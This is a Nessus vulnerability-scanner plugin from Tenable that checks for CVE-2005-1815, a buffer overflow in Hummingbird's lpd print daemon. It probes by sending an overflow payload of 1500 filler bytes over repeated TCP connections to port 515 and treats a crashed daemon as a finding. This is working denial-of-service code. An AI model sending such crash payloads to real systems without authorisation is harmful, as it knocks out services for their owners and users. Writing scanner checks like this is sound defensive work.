#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18403);
  script_version("$Revision: 1.6 $");
  script_cve_id("CVE-2005-1815");
  script_bugtraq_id(13788);
  script_xref(name:"OSVDB", value:"16957");

  script_name(english:"Hummingbird InetD LPD Component (Lpdw.exe) Data Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host contains an application that is affected by a buffer
overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The lpd daemon installed on the remote host appears to be from the
Hummingbird Connectivity suite and to suffer from a buffer overflow
vulnerability.  An attacker can crash the daemon by sending commands
with overly-long queue names and, with a specially-crafted packet,
even execute code remotely within the context of the affected service.");

 script_set_attribute(attribute:"see_also", value:
 "http://www.nessus.org/u?bbff422b" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
  script_summary(english:"Checks for buffer overflow vulnerability in Hummingbird lpd");
  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencie("find_service1.nasl");
  script_require_ports("Services/lpd", 515);

  exit(0);
}


include("global_settings.inc");
if ( report_paranoia < 1 ) exit(0);

port = get_kb_item("Services/lpd");
if (!port) port = 515;
if (!get_port_state(port)) exit(0);


# Try to crash the remote lpd. (A working buffer overflow exploit
# is left as an exercise for the reader. :-)
exploit = raw_string(1)+ crap(1500) + raw_string(0x0A);
# nb: 'max' must be > 3 + maximum number of servers configured 
#     on the remote (default is 4).
max = 15;
for (i=1; i<=max; ++i) {
  soc[i] = open_priv_sock_tcp(dport:port);

  if (soc[i]) {
    send(socket:soc[i], data:exploit);
  }
  else {
    # If the first 2 connection attempts failed, just exit.
    if (i == 2 && !soc[1] && !soc[2]) {
      exit(0);
    }
    # Otherwise, there's a problem if the previous 2 attempts failed as well.
    else if (i >= 2 && !soc[i-1] && !soc[i-2]) {
      security_warning(port);
      break;
    }
    # Maybe the daemon is just busy.
    sleep(1);
  }
}


# Close any open sockets.
for (i=1; i<=max; i++) {
  if (soc[i]) close(soc[i]);
}
